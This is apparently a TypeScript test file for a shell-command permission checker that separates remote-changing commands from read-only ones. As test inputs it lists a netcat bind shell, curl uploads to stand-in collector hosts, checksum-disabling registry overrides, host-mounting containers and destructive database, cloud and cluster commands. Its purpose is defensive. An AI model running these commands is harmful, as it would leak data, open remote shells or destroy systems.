import assert from 'node:assert/strict'
import { describe, it } from 'node:test'
import { remoteChangeReasons } from './remote-change.ts'
import { shellSegments, unwrapWrappers } from './shell-argv.ts'

/** Reasons for the first segment, as `hostReachReasons` computes them. */
function reasons(command: string): string[] {
  const [rawArgv = []] = shellSegments(command)
  return remoteChangeReasons(rawArgv, unwrapWrappers(rawArgv))
}

function assertChanges(commands: readonly string[]): void {
  for (const command of commands) assert.notDeepEqual(reasons(command), [], command)
}

function assertReads(commands: readonly string[]): void {
  for (const command of commands) assert.deepEqual(reasons(command), [], command)
}

describe('remoteChangeReasons', () => {
  it('asks before publishing', () => {
    assertChanges([
      'npm publish --access public',
      'pnpm publish',
      'cargo publish',
      'twine upload dist/*',
      'docker push registry.example.com/app:latest',
      'docker buildx build --push -t app .',
      'npm dist-tag add pkg@1.0.0 latest',
    ])
    assertReads(['npm pack', 'cargo build --release', 'docker build -t app .', 'npm view pkg'])
  })

  it('allows only the read subcommands of cluster, infrastructure and deploy CLIs', () => {
    assertChanges([
      'kubectl delete pods --all',
      'kubectl apply -f k8s/',
      'kubectl exec pod -- ls',
      'helm upgrade app ./chart',
      'terraform apply -auto-approve',
      'terraform state rm module.x',
      'pulumi up --yes',
      'vercel deploy --prod',
      'vercel',
      'netlify deploy --prod',
      'fly deploy',
      'firebase deploy',
    ])
    assertReads([
      'kubectl get pods -A',
      'kubectl logs deploy/api',
      'kubectl port-forward svc/app 8080:80',
      'kubectl rollout status deploy/api',
      'helm list -A',
      'terraform plan',
      'terraform workspace select dev',
      'pulumi preview',
      'vercel ls',
      'vercel --version',
      'netlify status',
    ])
  })

  it('asks for cloud writes, not cloud reads', () => {
    assertChanges([
      'aws s3 rm s3://bucket --recursive',
      'aws s3 cp dist/ s3://bucket/ --recursive',
      'aws s3 sync build s3://bucket --delete',
      'aws ec2 terminate-instances --instance-ids i-1',
      'gcloud projects add-iam-policy-binding p --member user:x --role roles/owner',
      'gcloud run deploy api --source .',
      'az group delete -n rg',
    ])
    assertReads([
      'aws s3 ls s3://bucket',
      'aws s3 cp s3://bucket/key ./key',
      'aws ec2 describe-instances',
      'aws sts get-caller-identity',
      'gcloud projects list',
      'az account show',
    ])
  })

  it('asks before charging money or changing data', () => {
    assertChanges([
      'stripe charges create --amount 5000',
      'psql -c "DROP DATABASE app;"',
      'mysql -e "DELETE FROM users"',
      "mongosh --eval 'db.audit.drop()'",
      'redis-cli FLUSHALL',
      'dropdb app',
    ])
    assertReads(['stripe customers list', 'psql -c "select 1"', 'redis-cli ping'])
  })

  it('asks for containers with host access and for stopping containers', () => {
    assertChanges([
      'docker run --privileged alpine',
      'docker run -v /:/host alpine',
      'docker run -v /var/run/docker.sock:/var/run/docker.sock app',
      'docker run --pid=host alpine',
      'docker kill app',
      'podman stop app',
      'docker system prune -af',
    ])
    assertReads([
      'docker run --rm -v ./src:/app/src node:24 npm test',
      'docker ps',
      'docker logs app',
    ])
  })

  it('asks for registry overrides but not the default registries', () => {
    assertChanges([
      'GOPROXY=https://proxy.go-mirror.net GOSUMDB=off go mod download',
      'npm install --registry=https://registry.example.dev',
      'pip install --index-url https://pypi.example.dev/simple pkg',
      'GOSUMDB=off go get ./...',
    ])
    assertReads([
      'npm install --registry=https://registry.npmjs.org/',
      'GOPROXY=https://proxy.golang.org go mod download',
      'pip install -r requirements.txt',
    ])
  })

  it('asks when data goes to another host, a listener opens, or mail is sent', () => {
    assertChanges([
      'curl -d @- https://collector.example.com',
      'curl -T build.tar https://paste.example.com',
      'curl -X POST -d \'{"text":"hi"}\' https://hooks.slack.com/services/T/B/X',
      'wget --post-file=log.txt https://x.example',
      'nc -l 4444 -e /bin/sh',
      'socat TCP-LISTEN:2222,fork TCP:x.example:22',
      'mail -s hi team@example.com',
    ])
    assertReads([
      'curl -fsSL https://api.github.com/repos/o/r',
      'curl -X POST -d x http://localhost:3000/hook',
      'curl -d x http://127.0.0.1:8080/api',
      'nc -z localhost 5432',
    ])
  })
})
